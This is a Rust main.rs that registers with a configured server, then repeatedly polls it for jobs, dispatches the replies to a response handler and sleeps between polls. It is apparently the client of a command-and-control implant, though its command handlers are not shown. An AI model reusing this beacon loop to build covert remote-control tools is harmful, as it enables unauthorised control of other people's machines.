mod serializer;
mod commands;
mod config;
mod util;

use crate::commands::{register, build_payload_get_job, send, handle_response};
use crate::serializer::Serializer;

use std::time::Duration;
use std::thread;

fn main() {
    let (payload, id) = register();
    match send(payload.get_buffer(), config::IP, config::PORT, false) {
        Ok(_) => {
        }
        Err(_) => {
            eprintln!("fatal error");
            std::process::exit(1);
        }
    }

    thread::sleep(Duration::from_millis(500));

    loop {
        let payload = build_payload_get_job(id);

        match send(payload.get_buffer(), config::IP, config::PORT, false) {
            Ok(resp_data) => {
                let serialized_data = Serializer::new(&resp_data);
                handle_response(serialized_data);
            }
            Err(_) => {
                eprintln!("fatal error");
                std::process::exit(1);
            }
        }

        thread::sleep(Duration::from_secs(config::SLEEP_TIME));
    }

}
